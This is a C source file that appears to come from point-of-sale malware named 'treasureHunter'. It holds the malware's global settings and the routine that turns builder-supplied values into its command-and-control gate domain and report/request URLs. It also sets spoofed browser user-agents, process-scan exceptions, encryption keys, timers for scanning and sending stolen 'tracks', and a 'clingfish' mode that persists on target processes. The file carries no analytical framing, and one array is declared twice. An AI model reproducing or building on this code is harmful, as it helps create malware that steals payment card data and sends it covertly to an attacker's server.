/*Preset variables*/
/*int debug = 1;*/
int debug;

void showDebugMessage(TCHAR *message, int outputDebug){
	if (debug == 1){
		MessageBox(NULL, message, L"Debug Message", MB_OK);
		if (outputDebug == 1)
			OutputDebugString(message);
	}
}

/*int tracksArrSize = 4;*/
int tracksArrSize;
/*char *firstEncKey = "firstEncryptionKey";*/
char *firstEncKey;

#define SCANEXCEPTIONSNUM 3
char *scanExceptions[SCANEXCEPTIONSNUM] = {"System32", "SysWOW64", "\\Windows\\explorer.exe"};
char *scanExceptions[SCANEXCEPTIONSNUM];

int checkServiceCodes = 1;
#define SERVICECODESNUM 6
char *serviceCodes[SERVICECODESNUM] = {"101", "201", "121", "231", "221", "110"};

int recordNoExpOrSCodeEnabled = 0;

char *userAgentRequest = "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; InfoPath.2; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727)";
char *userAgentReport = "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729)";
/*LPCWSTR gateDomain = L"localhost";*/
char *gateDomain;
/*LPCWSTR gateRequestURL = L"/treasureHunter/gate.php?request=true";*/
char *gateRequestURL;
/*LPCWSTR gateReportURL = L"/treasureHunter/gate.php?report=true";*/
char *gateReportURL;

/*int scanPause = 5 * 60000;*/
int scanPause;
/*int sendPause = 5 * 60000;*/
int sendPause;

/*int useClingfishMode = 1;*/
int useClingfishMode;
/*int clingfishPause = 1 * 60000;*/
int clingfishPause;
/*int scanPauseAfterClingfishMode = 10 * 60000;*/
int scanPauseAfterClingfishMode;

/*Changing variables*/
char *levelOneRC4Key;
char *levelTwoPirateCodeKey;
char *levelThreeRC4Key;
int tracksArrIndex = 0;

HINTERNET hSession, hConnect;

CRITICAL_SECTION m_cs;

HANDLE *clingfishThreads;
int *clingfishProcs;
int clingfishProcsCount = 0;

char *systemID;

/*Translate variables configured by the builder to the needed format*/
void initGlobals(){
	int i, gateDomainLength, gateURLLength;
	char *gateURL;

	/*---debug config---*/
	if (debugConfig[0] == '1')
		debug = 1;
	else
		debug = 0;

	/*---gate config---*/
	gateDomainLength = strlen(gateURLConfig);
	for(i=0; gateURLConfig[i]!='/' && i<gateDomainLength; i++);
	gateDomainLength = i;

	gateURLLength = strlen(gateURLConfig) - gateDomainLength;

	gateDomain = (char*)safeMalloc(sizeof(char) * (i + 1));
	arrCopy(gateDomain, gateURLConfig, i);
	gateDomain[i] = '\0';
	
	gateURL = (char*)safeMalloc(sizeof(char) * (gateURLLength + 1));
	if (gateURLLength != 0){
		gateURL[0] = '/';
		for (i++; gateURLConfig[i]!='\0' && i-gateDomainLength<gateURLLength; i++)
			gateURL[i-gateDomainLength] = gateURLConfig[i];
		gateURL[i-gateDomainLength] = '\0';
	} else {
		gateURL[0] = '\0';
		i = gateDomainLength;
	}


	gateReportURL = combineArrs(gateURL, i-gateDomainLength, "?report=true", 12);
	gateRequestURL = combineArrs(gateURL, i-gateDomainLength, "?request=true", 13);
	free(gateURL);

	/*---standard time pauses config---*/
	scanPause = stringToInt(scanPauseConfig);
	sendPause = stringToInt(sendPauseConfig);

	/*---clingfish settings--*/
	if (useClingfishModeConfig[0] == '1')
		useClingfishMode = 1;
	else
		useClingfishMode = 0;
	clingfishPause = stringToInt(clingfishPauseConfig);
	scanPauseAfterClingfishMode = stringToInt(scanPauseAfterClingfishModeConfig);

	/*---other---*/
	tracksArrSize = stringToInt(tracksArrSizeConfig);
	firstEncKey = firstEncKeyConfig;
}